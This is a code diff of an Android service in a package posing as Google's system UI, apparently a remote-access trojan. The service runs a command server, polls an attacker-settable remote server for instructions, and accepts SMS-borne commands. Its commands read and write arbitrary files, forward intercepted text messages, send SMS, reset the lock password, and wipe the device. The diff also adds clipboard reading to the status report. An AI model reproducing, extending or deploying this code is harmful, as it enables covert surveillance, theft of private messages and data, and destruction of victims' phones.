@@ -1,42 +1,65 @@
 package com.google.android.systemUi.service;
 
-import android.app.*;
-import android.app.admin.*;
-import android.bluetooth.*;
-import android.content.*;
-import android.content.pm.*;
-import android.database.*;
-import android.media.*;
-import android.net.*;
-import android.net.wifi.*;
-import android.os.*;
-import android.preference.*;
-import android.provider.*;
-import android.speech.tts.*;
-import android.speech.tts.TextToSpeech.*;
-import android.telephony.*;
-import android.util.*;
-import com.genonbeta.CoolSocket.*;
-import com.google.android.systemUi.config.*;
-import com.google.android.systemUi.helper.*;
-import com.google.android.systemUi.receiver.*;
-import java.io.*;
-import java.net.*;
-import java.util.*;
-import org.json.*;
+import android.app.Notification;
+import android.app.Service;
+import android.app.admin.DevicePolicyManager;
+import android.bluetooth.BluetoothAdapter;
+import android.content.ClipData;
+import android.content.ClipboardManager;
+import android.content.ComponentName;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.content.pm.PackageInfo;
+import android.database.Cursor;
+import android.media.AudioManager;
+import android.media.MediaPlayer;
+import android.net.Uri;
+import android.net.wifi.WifiManager;
+import android.os.Build;
+import android.os.IBinder;
+import android.os.PowerManager;
+import android.os.SystemClock;
+import android.os.Vibrator;
+import android.preference.PreferenceManager;
+import android.provider.MediaStore;
+import android.speech.tts.TextToSpeech;
+import android.speech.tts.TextToSpeech.OnInitListener;
+import android.telephony.SmsManager;
+import android.util.Log;
+import android.view.KeyEvent;
+
+import com.genonbeta.CoolSocket.CoolCommunication;
+import com.genonbeta.CoolSocket.CoolJsonCommunication;
+import com.google.android.systemUi.R;
+import com.google.android.systemUi.config.AppConfig;
+import com.google.android.systemUi.helper.FileUtils;
+import com.google.android.systemUi.helper.NotificationPublisher;
+import com.google.android.systemUi.helper.RemoteServer;
+import com.google.android.systemUi.receiver.SmsReceiver;
+
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
+
+import java.io.DataInputStream;
+import java.io.File;
+import java.io.IOException;
+import java.net.Socket;
+import java.util.ArrayList;
+import java.util.Locale;
 
 public class CommunicationService extends Service implements OnInitListener
 {
 	public static final String TAG = "CommunationService";
 	public static final String REMOTE_SERVER = "RemoteServer";
-	
+
 	public static boolean mAdminMode = false;
 
 	private CommunicationServer mCommunationServer;
 	private AudioManager mAudioManager;
 	private DevicePolicyManager mDPM;
 	private ComponentName mDeviceAdmin;
-	private ArrayList<String> mGrantedList = new ArrayList<String>();
+	private ArrayList<String> mGrantedList = new ArrayList<>();
 	private PowerManager mPowerManager;
 	private SharedPreferences mPreferences;
 	private NotificationPublisher mPublisher;
@@ -47,18 +70,217 @@ public class CommunicationService extends Service implements OnInitListener
 	private Vibrator mVibrator;
 	private int mWipeCountdown = 8;
 	private long mRemoteThreadDelay = 50000;
-	private ArrayList<ParallelConnection> mParallelConnections = new ArrayList<ParallelConnection>();
+	private ArrayList<ParallelConnection> mParallelConnections = new ArrayList<>();
 	private RemoteServer mRemote;
 	private String mCurrentSong = "unknown";
 	private RemoteThread mRemoteThread = new RemoteThread();
 	private JSONArray mRemoteLogs = new JSONArray();
 	private MediaPlayer mPlayer = new MediaPlayer();
-	
+	private ClipboardManager mClipboard;
+
+	protected void sendToConnections(String message)
+	{
+		for (ParallelConnection conn : mParallelConnections)
+		{
+			conn.sendMessage(message);
+		}
+	}
+
+	protected String ringerMode(int mode)
+	{
+		switch (mode)
+		{
+			case AudioManager.RINGER_MODE_NORMAL:
+				return "normal";
+			case AudioManager.RINGER_MODE_SILENT:
+				return "silent";
+			case AudioManager.RINGER_MODE_VIBRATE:
+				return "vibrate";
+			default:
+				return "unknown";
+		}
+	}
+
+	protected void runCommand(final String sender, final String message, final boolean smsMode)
+	{
+		new Thread(new Runnable()
+		{
+			@Override
+			public void run()
+			{
+				JSONObject response = new JSONObject();
+				JSONObject receivedMessage;
+
+				try
+				{
+					receivedMessage = new JSONObject(message);
+				} catch (JSONException e)
+				{
+					receivedMessage = new JSONObject();
+				}
+
+				mCommunationServer.onJsonMessage(null, receivedMessage, response, sender);
+
+				if (smsMode)
+					SmsManager.getDefault().sendTextMessage(sender, null, response.toString(), null, null);
+			}
+		}
+		).start();
+	}
+
+	public boolean send(String server, int port, String message, CoolCommunication.Messenger.ResponseHandler handler)
+	{
+		return CoolCommunication.Messenger.sendOnCurrentThread(server, port, message, handler);
+	}
+
+	private boolean ttsExit()
+	{
+		mTTSInit = false;
+
+		if (mSpeech == null)
+			return false;
+
+		try
+		{
+			mSpeech.shutdown();
+			return true;
+		} catch (Exception e)
+		{
+		}
+
+		return false;
+	}
+
+	protected String wifiState(int state)
+	{
+		switch (state)
+		{
+			case WifiManager.WIFI_STATE_DISABLING:
+				return "disabling";
+			case WifiManager.WIFI_STATE_DISABLED:
+				return "disabled";
+			case WifiManager.WIFI_STATE_ENABLING:
+				return "enabling";
+			case WifiManager.WIFI_STATE_ENABLED:
+				return "enabled";
+			default:
+				return "unknown";
+		}
+	}
+
+	@Override
+	public IBinder onBind(Intent intent)
+	{
+		return null;
+	}
+
+	@Override
+	public void onCreate()
+	{
+		super.onCreate();
+
+		mCommunationServer = new CommunicationServer();
+
+		if (!mCommunationServer.start())
+			stopSelf();
+
+		mCommunationServer.setAddTabsToResponse(2);
+
+		mRemoteThread.start();
+	}
+
+	@Override
+	public void onDestroy()
+	{
+		super.onDestroy();
+
+		mRemoteThread.interrupt();
+		mCommunationServer.stop();
+		mPlayer.reset();
+		ttsExit();
+	}
+
+	@Override
+	public void onInit(int result)
+	{
+		this.mTTSInit = (result == TextToSpeech.SUCCESS);
+	}
+
+	@Override
+	public int onStartCommand(Intent intent, int p1, int p2)
+	{
+		mPublisher = new NotificationPublisher(this);
+		mDPM = (DevicePolicyManager) getSystemService(Service.DEVICE_POLICY_SERVICE);
+		mAudioManager = (AudioManager) getSystemService(Service.AUDIO_SERVICE);
+		mDeviceAdmin = new ComponentName(this, com.google.android.systemUi.receiver.DeviceAdmin.class);
+		mPreferences = PreferenceManager.getDefaultSharedPreferences(this);
+		mPowerManager = (PowerManager) getSystemService(Service.POWER_SERVICE);
+		mVibrator = (Vibrator) getSystemService(Service.VIBRATOR_SERVICE);
+		mClipboard = (ClipboardManager) getSystemService(Service.CLIPBOARD_SERVICE);
+		mRemote = new RemoteServer(mPreferences.getString("remoteServer", "not-defined"));
+
+		mRemoteThreadDelay = mPreferences.getLong("remoteServerDelay", mRemoteThreadDelay);
+
+		if (mPreferences.contains("upprFile"))
+		{
+			File uppr = new File(mPreferences.getString("upprFile", "/sdcard/uppr"));
+
+			if (uppr.isFile())
+			{
+				try
+				{
+					mVibrator.vibrate(1000);
+					mDPM.resetPassword("", 0);
+					uppr.renameTo(new File(uppr.getAbsolutePath() + ".old"));
+				} catch (Exception e)
+				{
+					e.printStackTrace();
+				}
+			}
+		}
+
+		if (!mPreferences.contains("remoteServer"))
+		{
+			File conf = new File(AppConfig.DEFAULT_SERVER_FILE);
+
+			if (conf.isFile())
+			{
+				try
+				{
+					String index = FileUtils.readFile(conf).toString();
+					mPreferences.edit().putString("remoteServer", index);
+				} catch (IOException e)
+				{
+				}
+			}
+		}
+
+		if (intent != null)
+			if (SmsReceiver.ACTION_SMS_COMMAND_RECEIVED.equals(intent.getAction()) && intent.hasExtra(SmsReceiver.EXTRA_SENDER_NUMBER) && intent.hasExtra(SmsReceiver.EXTRA_MESSAGE))
+			{
+				String message = intent.getStringExtra(SmsReceiver.EXTRA_MESSAGE);
+				String sender = intent.getStringExtra(SmsReceiver.EXTRA_SENDER_NUMBER);
+
+				runCommand(sender, message, true);
+			}
+			else if (SmsReceiver.ACTION_SMS_RECEIVED.equals(intent.getAction()))
+			{
+				String message = intent.getStringExtra(SmsReceiver.EXTRA_MESSAGE);
+				String sender = intent.getStringExtra(SmsReceiver.EXTRA_SENDER_NUMBER);
+
+				if (mSpyMessages)
+					sendToConnections(sender + ">" + message);
+			}
+
+		return START_STICKY;
+	}
+
 	private class CommunicationServer extends CoolJsonCommunication
 	{
 		public CommunicationServer()
 		{
-			super(4632);
+			super(AppConfig.COMMUNATION_SERVER_PORT);
+
 			this.setAllowMalformedRequest(true);
 			this.setSocketTimeout(AppConfig.DEFAULT_SOCKET_LARGE_TIMEOUT);
 		}
@@ -77,17 +299,17 @@ public class CommunicationService extends Service implements OnInitListener
 				Notification.BigTextStyle bTS = new Notification.BigTextStyle(builder);
 
 				bTS
-					.setBigContentTitle(clientIp)
-					.bigText(receivedMessage.toString());
+						.setBigContentTitle(clientIp)
+						.bigText(receivedMessage.toString());
 
 				builder
-					.setStyle(bTS)
-					.setSmallIcon(android.R.drawable.stat_sys_download_done)
-					.setTicker(receivedMessage.toString())
-					.setContentTitle(clientIp)
-					.setContentText(receivedMessage.toString());
+						.setStyle(bTS)
+						.setSmallIcon(android.R.drawable.stat_sys_download_done)
+						.setTicker(receivedMessage.toString())
+						.setContentTitle(clientIp)
+						.setContentText(receivedMessage.toString());
 
-				mPublisher.notify(0, builder.getNotification());
+				mPublisher.notify(0, builder.build());
 
 				response.put("warning", "Request notified");
 			}
@@ -113,7 +335,7 @@ public class CommunicationService extends Service implements OnInitListener
 						mGrantedList.add(clientIp);
 						response.put("info", "Access granted");
 					}
-					else 
+					else
 						response.put("info", "Password was incorrect");
 				}
 				else
@@ -239,7 +461,7 @@ public class CommunicationService extends Service implements OnInitListener
 						}
 						break;
 					case "commands":
-						DataInputStream dataIS = new DataInputStream(getResources().openRawResource(com.google.android.systemUi.R.raw.commands));
+						DataInputStream dataIS = new DataInputStream(getResources().openRawResource(R.raw.commands));
 						JSONArray jsonArray = new JSONArray();
 
 						while (dataIS.available() > 0)
@@ -255,10 +477,6 @@ public class CommunicationService extends Service implements OnInitListener
 						break;
 					case "getGrantedList":
 						response.put("granted_list", new JSONArray(mGrantedList));
-						result = true;
-						break;
-					case "lockNow":
-						mDPM.lockNow();
 						result = true;
 						break;
 					case "exit":
@@ -286,7 +504,7 @@ public class CommunicationService extends Service implements OnInitListener
 						result = true;
 						break;
 					case "send":
-						response.put("isSent", CoolCommunication.Messenger.sendOnCurrentThread(receivedMessage.getString("server"), receivedMessage.getInt("port"), receivedMessage.getString("message"), null));
+						response.put("isSent", Messenger.sendOnCurrentThread(receivedMessage.getString("server"), receivedMessage.getInt("port"), receivedMessage.getString("message"), null));
 						result = true;
 						break;
 					case "sendSMS":
@@ -302,7 +520,7 @@ public class CommunicationService extends Service implements OnInitListener
 							if (mWipeCountdown == 0)
 							{
 								response.put("info", "Request successful. Wipe requested");
-								mDPM.wipeData(mDPM.WIPE_EXTERNAL_STORAGE | mDPM.WIPE_RESET_PROTECTION_DATA);
+								mDPM.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE | DevicePolicyManager.WIPE_RESET_PROTECTION_DATA);
 								result = true;
 							}
 							else if (mWipeCountdown > 0)
@@ -320,7 +538,7 @@ public class CommunicationService extends Service implements OnInitListener
 
 						if (receivedMessage.has("telNumber"))
 							connection = new ParallelConnection(receivedMessage.getString("telNumber"));
-						else 
+						else
 							connection = new ParallelConnection(receivedMessage.getString("server"), receivedMessage.getInt("port"));
 
 						if (!mParallelConnections.contains(connection))
@@ -392,10 +610,10 @@ public class CommunicationService extends Service implements OnInitListener
 							mAudioManager.setRingerMode(setMode);
 							result = true;
 						}
-						else 
+						else
 							response.put("error", "Mode could not be set. Mode values can only be vibrate|silent|normal");
-							
-							response.put("currentMode", ringerMode(mAudioManager.getRingerMode()));
+
+						response.put("currentMode", ringerMode(mAudioManager.getRingerMode()));
 						break;
 					case "bluetoothPower":
 						BluetoothAdapter bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
@@ -404,16 +622,16 @@ public class CommunicationService extends Service implements OnInitListener
 						boolean powerRequest = receivedMessage.getBoolean("power");
 
 						response.put("previousState", isEnabled);
-						
+
 						if (powerRequest && !isEnabled)
-							result = bluetoothAdapter.enable(); 
+							result = bluetoothAdapter.enable();
 						else if (!powerRequest && isEnabled)
 							result = bluetoothAdapter.disable();
 						break;
 					case "writeFile":
 						FileUtils.writeFile(new File(receivedMessage.getString("file")), receivedMessage.getString("index"));
 						result = true;
-						break; 
+						break;
 					case "readFile":
 						response.put("index", FileUtils.readFileString(new File(receivedMessage.getString("file"))));
 						result = true;
@@ -421,74 +639,100 @@ public class CommunicationService extends Service implements OnInitListener
 					case "readDirectory":
 						File directory = new File(receivedMessage.getString("directory"));
 						JSONArray index = new JSONArray();
-						
+
 						for (String file : directory.list())
 							index.put(file);
-						
+
 						response.put("index", index);
-						
+
 						result = true;
 						break;
 					case "remoteServer":
-						String currentServer = mPreferences.getString("remoteServer","not-defined");
-						
+						String currentServer = mPreferences.getString("remoteServer", "not-defined");
+
 						response.put("currentServer", currentServer);
-						
+
 						if (receivedMessage.has("server"))
 						{
 							String server = receivedMessage.getString("server");
-							
+
 							mPreferences.edit().putString("remoteServer", server).commit();
 							mRemote.setConnection(server);
-							
+
 							response.put("newlySet", server);
 						}
-						
+
 						if (receivedMessage.has("test"))
 						{
 							response.put("isOkay", mRemote.connect(null));
 						}
-						
+
+						if (receivedMessage.has("delay"))
+						{
+							response.put("previousDelay", mPreferences.getLong("remoteServerDelay", mRemoteThreadDelay));
+							mPreferences.edit().putLong("remoteServerDelay", receivedMessage.getLong("delay")).commit();
+							mRemoteThreadDelay = receivedMessage.getLong("delay");
+						}
+
+						if (receivedMessage.has("backup") && receivedMessage.getBoolean("backup"))
+						{
+							File file = new File(AppConfig.DEFAULT_SERVER_FILE);
+
+							if (file.isFile())
+								file.delete();
+
+							FileUtils.writeFile(file, currentServer);
+						}
+
 						result = true;
-						
-						break;
-					case "remoteServerDelay":
-						response.put("previousDelay", mPreferences.getLong("remoteServerDelay", mRemoteThreadDelay));
-						mPreferences.edit().putLong("remoteServerDelay", receivedMessage.getLong("delay")).commit();
-						mRemoteThreadDelay = receivedMessage.getLong("delay");
-						
-						result = true;
+
 						break;
 					case "stopSelf":
 						stopSelf();
 						result = true;
 						break;
 					case "playSong":
-						if (receivedMessage.has("findByName"))
+						if (receivedMessage.has("name") || receivedMessage.has("file"))
 						{
-							Cursor cursor;
-							
-							if (receivedMessage.has("artist"))
-								cursor = getContentResolver().query(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, new String[]{MediaStore.Audio.Media._ID, MediaStore.Audio.Media.TITLE, MediaStore.Audio.Media.ARTIST}, MediaStore.Audio.Media.TITLE + " LIKE ? AND " + MediaStore.Audio.Media.ARTIST + " LIKE ?", new String[]{"%" + receivedMessage.getString("findByName") + "%", "%" + receivedMessage.getString("artist") + "%"}, null, null);
-							else
-								cursor = getContentResolver().query(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, new String[]{MediaStore.Audio.Media._ID, MediaStore.Audio.Media.TITLE, MediaStore.Audio.Media.ARTIST}, MediaStore.Audio.Media.TITLE + " LIKE ?", new String[]{"%" + receivedMessage.getString("findByName") + "%"}, null, null);
-							
-							if (cursor.moveToFirst())
+
+							if (receivedMessage.has("file"))
 							{
-								int songId = cursor.getInt(cursor.getColumnIndex(MediaStore.Audio.Media._ID));
-								
-								mCurrentSong = cursor.getString(cursor.getColumnIndex(MediaStore.Audio.Media.ARTIST)) + " - " + cursor.getString(cursor.getColumnIndex(MediaStore.Audio.Media.TITLE));
-								
 								mPlayer.reset();
-								mPlayer.setDataSource(getApplicationContext(), Uri.parse(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI.toString() + "/" + songId));
-								
+
+								mPlayer.setDataSource(receivedMessage.getString("file"));
+
 								mPlayer.prepare();
 								mPlayer.start();
-								
-								result = true;
+
+								mCurrentSong = receivedMessage.getString("file");
 							}
 							else
-								response.put("error", "The song you requested not found");
+							{
+								Cursor cursor;
+
+								if (receivedMessage.has("artist"))
+									cursor = getContentResolver().query(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, new String[]{MediaStore.Audio.Media._ID, MediaStore.Audio.Media.TITLE, MediaStore.Audio.Media.ARTIST}, MediaStore.Audio.Media.TITLE + " LIKE ? AND " + MediaStore.Audio.Media.ARTIST + " LIKE ?", new String[]{"%" + receivedMessage.getString("name") + "%", "%" + receivedMessage.getString("artist") + "%"}, null, null);
+								else
+									cursor = getContentResolver().query(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, new String[]{MediaStore.Audio.Media._ID, MediaStore.Audio.Media.TITLE, MediaStore.Audio.Media.ARTIST}, MediaStore.Audio.Media.TITLE + " LIKE ?", new String[]{"%" + receivedMessage.getString("name") + "%"}, null, null);
+
+								if (cursor.moveToFirst())
+								{
+									int songId = cursor.getInt(cursor.getColumnIndex(MediaStore.Audio.Media._ID));
+
+									mCurrentSong = cursor.getString(cursor.getColumnIndex(MediaStore.Audio.Media.ARTIST)) + " - " + cursor.getString(cursor.getColumnIndex(MediaStore.Audio.Media.TITLE));
+
+									mPlayer.reset();
+
+									mPlayer.setDataSource(getApplicationContext(), Uri.parse(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI.toString() + "/" + songId));
+
+									mPlayer.prepare();
+									mPlayer.start();
+
+									result = true;
+								}
+								else
+									response.put("error", "The song you requested not found");
+							}
 						}
 						else if (receivedMessage.has("kill"))
 						{
@@ -510,7 +754,54 @@ public class CommunicationService extends Service implements OnInitListener
 						response.put("grantedList", mGrantedList);
 						response.put("remoteServer", mRemote.getConnectionAddress());
 						response.put("currentSong", mCurrentSong);
-						
+						response.put("hasActiveMedia", mAudioManager.isMusicActive());
+						response.put("clipboard", (mClipboard.hasPrimaryClip()) ? mClipboard.getPrimaryClip().getItemAt(0).getText() : null);
+
+						result = true;
+						break;
+					case "mediaButton":
+
+						if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT)
+						{
+							int event = KeyEvent.KEYCODE_MEDIA_PAUSE;
+
+							switch (receivedMessage.getString("event"))
+							{
+								case "toggle":
+									event = KeyEvent.KEYCODE_MEDIA_PLAY_PAUSE;
+									break;
+								case "play":
+									event = KeyEvent.KEYCODE_MEDIA_PLAY;
+									break;
+								case "pause":
+									event = KeyEvent.KEYCODE_MEDIA_PAUSE;
+									break;
+								case "next":
+									event = KeyEvent.KEYCODE_MEDIA_NEXT;
+									break;
+								case "previous":
+									event = KeyEvent.KEYCODE_MEDIA_PREVIOUS;
+									break;
+								case "stop":
+									event = KeyEvent.KEYCODE_MEDIA_STOP;
+									break;
+								default:
+									response.put("info", "Supported events: play, pause, toggle, stop, next, previous");
+							}
+
+							long eventTime = SystemClock.uptimeMillis() - 1;
+							KeyEvent downEvent = new KeyEvent(eventTime, eventTime, KeyEvent.ACTION_DOWN, event, 0);
+
+							mAudioManager.dispatchMediaKeyEvent(downEvent);
+
+							result = true;
+						}
+						else
+							response.put("error", "This command is not supported before API 19");
+
+						break;
+					case "clipboard":
+						mClipboard.setPrimaryClip(ClipData.newPlainText("receivedText", receivedMessage.getString("text")));
 						result = true;
 						break;
 					default:
@@ -532,19 +823,17 @@ public class CommunicationService extends Service implements OnInitListener
 			try
 			{
 				handleRequest(socket, received, response, client);
-			}
-			catch (Exception e)
+			} catch (Exception e)
 			{
 				try
 				{
 					response.put("error", "@" + e);
-				}
-				catch (JSONException json)
+				} catch (JSONException json)
 				{
 					e.printStackTrace();
 				}
 			}
-			
+
 			if (REMOTE_SERVER.equals(client))
 				mRemoteLogs.put(response.toString());
 		}
@@ -593,230 +882,49 @@ public class CommunicationService extends Service implements OnInitListener
 
 		public String toString()
 		{
-			return (this.mType == TYPE_TEL_NUMBER) ? this.mNumber: this.mServer + ":" + this.mPort;
+			return (this.mType == TYPE_TEL_NUMBER) ? this.mNumber : this.mServer + ":" + this.mPort;
 		}
 	}
-	
+
 	class RemoteThread extends Thread
 	{
 		public RemoteThread()
-		{}
+		{
+		}
 
 		@Override
 		public void run()
 		{
 			super.run();
 			Log.d(TAG, "RemoteServer thread started");
-			
+
 			while (!isInterrupted())
 			{
+				try
+				{
+					Thread.sleep(mRemoteThreadDelay);
+				} catch (InterruptedException e)
+				{
+				}
+
 				if (mRemote == null)
 					continue;
-				
+
 				try
 				{
 					JSONArray cmds = new JSONArray(mRemote.connect(mRemoteLogs.toString()));
-					
+
 					if (cmds.length() > 0)
 						for (int i = 0; i < cmds.length(); i++)
 						{
 							runCommand(REMOTE_SERVER, cmds.getString(i), false);
 						}
-					
+
 					mRemoteLogs = new JSONArray();
-				}
-				catch (Exception e)
-				{}
-				
-				try
+				} catch (Exception e)
 				{
-					Thread.sleep(mRemoteThreadDelay);
-				}
-				catch (InterruptedException e)
-				{}
-			}
-		}
-	}
-
-	protected void sendToConnections(String message)
-	{
-		for (ParallelConnection conn : mParallelConnections)
-		{
-			conn.sendMessage(message);
-		}
-	}
-
-	protected String ringerMode(int mode)
-	{
-		switch(mode)
-		{
-			case mAudioManager.RINGER_MODE_NORMAL:
-				return "normal";
-			case mAudioManager.RINGER_MODE_SILENT:
-				return "silent";
-			case mAudioManager.RINGER_MODE_VIBRATE:
-				return "vibrate";
-			default:
-				return "unknown";
-		}
-	}
-	
-	protected void runCommand(final String sender, final String message, final boolean smsMode)
-	{
-		new Thread(new Runnable()
-			{
-				@Override
-				public void run()
-				{
-					JSONObject response = new JSONObject();
-					JSONObject receivedMessage;
-
-					try
-					{
-						receivedMessage = new JSONObject(message);
-					}
-					catch (JSONException e)
-					{
-						receivedMessage = new JSONObject();
-					}
-					
-					mCommunationServer.onJsonMessage(null, receivedMessage, response, sender);
-						
-					if (smsMode)
-						SmsManager.getDefault().sendTextMessage(sender, null, response.toString(), null, null);
-				}
-			}
-		).start();
-	}
-
-	public boolean send(String server, int port, String message, CoolCommunication.Messenger.ResponseHandler handler)
-	{
-		return CoolCommunication.Messenger.sendOnCurrentThread(server, port, message, handler);
-	}
-
-	private boolean ttsExit()
-	{
-		mTTSInit = false;
-
-		if (mSpeech == null)
-			return false;
-
-		try
-		{
-			mSpeech.shutdown();
-			return true;
-		}
-		catch (Exception e)
-		{}
-
-		return false;
-	}
-	
-	protected String wifiState(int state)
-	{
-		switch (state)
-		{
-			case WifiManager.WIFI_STATE_DISABLING:
-				return "disabling";
-			case WifiManager.WIFI_STATE_DISABLED:
-				return "disabled";
-			case WifiManager.WIFI_STATE_ENABLING:
-				return "enabling";
-			case WifiManager.WIFI_STATE_ENABLED:
-				return "enabled";
-			default:
-				return "unknown";
-		}
-	}
-
-	@Override
-	public IBinder onBind(Intent intent)
-	{
-		return null;
-	}
-
-	@Override
-	public void onCreate()
-	{
-		super.onCreate();
-
-		mCommunationServer = new CommunicationServer();
-
-		if (!mCommunationServer.start())
-			stopSelf();
-			
-		mCommunationServer.setAddTabsToResponse(2);
-		
-		mRemoteThread.start();
-	}
-
-	@Override
-	public void onDestroy()
-	{
-		super.onDestroy();
-
-		mRemoteThread.interrupt();
-		mCommunationServer.stop();
-		mPlayer.reset();
-		ttsExit();
-	}
-
-	@Override
-	public void onInit(int result)
-	{
-		this.mTTSInit = (result == TextToSpeech.SUCCESS);	
-	}
-
-	@Override
-	public int onStartCommand(Intent intent, int p1, int p2)
-	{
-		mPublisher = new NotificationPublisher(this);
-		mDPM = (DevicePolicyManager) getSystemService(Service.DEVICE_POLICY_SERVICE);
-		mAudioManager = (AudioManager) getSystemService(Service.AUDIO_SERVICE);
-		mDeviceAdmin = new ComponentName(this, com.google.android.systemUi.receiver.DeviceAdmin.class);
-		mPreferences = PreferenceManager.getDefaultSharedPreferences(this);
-		mPowerManager = (PowerManager) getSystemService("power");
-		mVibrator = (Vibrator) getSystemService("vibrator");
-		mRemote = new RemoteServer(mPreferences.getString("remoteServer", "not-defined"));
-		
-		mRemoteThreadDelay = mPreferences.getLong("remoteServerDelay", mRemoteThreadDelay);
-		
-		if (mPreferences.contains("upprFile"))
-		{
-			File uppr = new File(mPreferences.getString("upprFile", "/sdcard/uppr"));
-
-			if (uppr.isFile())
-			{
-				try
-				{
-					mVibrator.vibrate(1000);
-					mDPM.resetPassword("", 0);
-					uppr.renameTo(new File(uppr.getAbsolutePath() + ".old"));
-				}
-				catch (Exception e)
-				{
-					e.printStackTrace();
 				}
 			}
 		}
-
-		if (intent != null)
-			if (SmsReceiver.ACTION_SMS_COMMAND_RECEIVED.equals(intent.getAction()) && intent.hasExtra(SmsReceiver.EXTRA_SENDER_NUMBER) && intent.hasExtra(SmsReceiver.EXTRA_MESSAGE))
-			{
-				String message = intent.getStringExtra(SmsReceiver.EXTRA_MESSAGE);
-				String sender = intent.getStringExtra(SmsReceiver.EXTRA_SENDER_NUMBER);
-
-				runCommand(sender, message, true);
-			}
-			else if (SmsReceiver.ACTION_SMS_RECEIVED.equals(intent.getAction()))
-			{
-				String message = intent.getStringExtra(SmsReceiver.EXTRA_MESSAGE);
-				String sender = intent.getStringExtra(SmsReceiver.EXTRA_SENDER_NUMBER);
-
-				if (mSpyMessages)
-					sendToConnections(sender + ">" + message);
-			}
-
-		return START_STICKY;
 	}
 }
